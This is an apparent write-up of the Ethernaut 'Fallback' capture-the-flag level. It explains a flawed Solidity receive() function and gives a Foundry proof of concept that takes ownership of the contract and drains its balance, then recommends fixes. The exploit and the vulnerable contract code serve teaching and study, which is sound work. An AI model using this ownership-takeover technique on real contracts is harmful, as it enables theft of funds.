# Level 1 - Fallback

## Objectives

- claim ownership of the contract
- reduce its balance to 0

Things that might help

- How to send ether when interacting with an ABI
- How to send ether outside of the ABI
- Converting to and from wei/ether units (see help() command)
- Fallback methods

## Contract Overview

The fallback contract allows users to contribute ether to the contract. The contract is supposed to work as follows:

- `contribute()` function is restricted to payments smaller than `0.001 ether`

```solidity
    function contribute() public payable {
    require(msg.value < 0.001 ether); // <-- this line over here
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }
```

- if a user has contributed more than the owner, he then becomes the owner
  - claiming ownership this way would be very tedious because contributions of the initial owner are set to 1000 ether

```solidity
    function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) { // <-- this line over here
      owner = msg.sender; // <-- this line over here
    }
  }
```

- the owner can withdraw all of the funds

```solidity
  function withdraw() public onlyOwner {
    payable(owner).transfer(address(this).balance);
  }
```

## Finding the weak spots

The fallback contract contains a `receive()` function that at first glance contains flawed logic. That is why if we want to claim ownership of the contract we have to trigger `receive()` function. In order to do this we have to fullfill `require` condition.

```solidity
  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
```

> The receive function is executed on a call to the contract with empty calldata. This is the function that is executed on plain Ether transfers (e.g. via .send() or .transfer()). If no such function exists, but a payable fallback function exists, the fallback function will be called on a plain Ether transfer. If neither a receive Ether nor a payable fallback function is present, the contract cannot receive Ether through regular transactions and throws an exception.
>
> _Reference: https://docs.soliditylang.org/en/v0.8.12/contracts.html#receive-ether-function_

We can send Ether to other contracts by:

- transfer
- send
- call

  | Function   | Amount of Gas Forwarded        | Exception Propagation              |
  | :--------- | :----------------------------- | :--------------------------------- |
  | `send`     | 2300 (not adjustable)          | `false` on failure (returns bool)  |
  | `transfer` | 2300 (not adjustable)          | `throws` on failure (throws error) |
  | `call`     | all remaining gas (adjustable) | `false` on failure (returns bool)  |

  _Reference: https://solidity-by-example.org/sending-ether/_

We will need to use the `call` method so that the contract has enough gas left to change the `owner` state after performing the transfer. Both `send` and `transfer` have a fixed gas stipend which would be insufficient for this purpose.

## Potential attack scenario (hypothesis)

If attacker sends ether directly to the contract via external call, he can become the owner of the contract without the need to contribute more than the owner.

## Plan of the attack

1. Contribute with a small amount of ether to be added to the `contributions` mapping.
2. Trigger the fallback function (`receive()`) to gain ownership of the contract.
3. Confirm the ownership of the contract has changed.
4. Withdraw all the funds.

## Proof of Concept

Here is a simplified version of the unit test exploiting the vulnerability ([complete version here](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/test/01-Fallback.t.sol))

```solidity
  		//Triggering contribute function with value greater than 0
        fallbackContract.contribute{value: 1}();
        emit log_named_uint(
            "Attackers's contribution: ",
            fallbackContract.getContribution()
        );

        // Triggering the fallback function - we need to send a transaction to the contract without indicating a method. We are going to use global function call
        (bool success, ) = address(fallbackContract).call{value: 1}("");
        require(success);

        emit log_named_address(
            "New owner of the contract: ",
            fallbackContract.owner()
        );

        emit log_named_uint(
            "Balance of the contract before withdrawal: ",
            address(fallbackContract).balance
        );

        // Withdrawing contract balance
        fallbackContract.withdraw();

        emit log_named_uint(
            "Balance of the contract after withdrawal: ",
            address(fallbackContract).balance
        );
```

Here are the logs from the exploit contract:

![alt text](https://github.com/matrix-0wl/ethernaut-solutions-foundry/blob/master/img/Fallback.png)

## Recommendations

1. The first way to mitigate the issue would be to move ownership transfer out of the receive function into separate `transferOwnership()` function which would perform all the necessary checks.
2. Second possible solution is to add additional logic to the receive function to check if the user has enough contributions to become the owner. It could be done like this:

```solidity
receive() external payable {
	require(msg.value > 0 && contributions[msg.sender] > 0);
	contributions[msg.sender] += msg.value;

	if (contributions[msg.sender] > contributions[owner]) {
		owner = msg.sender;
	}
}
```

## Additional information

You can also read my two other solutions (using console and Remix) on my blog: https://matrix-0wl.gitbook.io/ethernaut/1.-fallback-fallback-function

## Acknowledgements

The structure of my reports is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
- [Joran Honig Twitter thread](https://twitter.com/joranhonig/status/1539578735631949825?s=20&t=Kp6iDNXfRKQUBbsb_Yj5SQ)

The recommendations section is based on the insights provided by:

- [ChmielewskiKamil](https://github.com/ChmielewskiKamil/ethernaut-foundry)
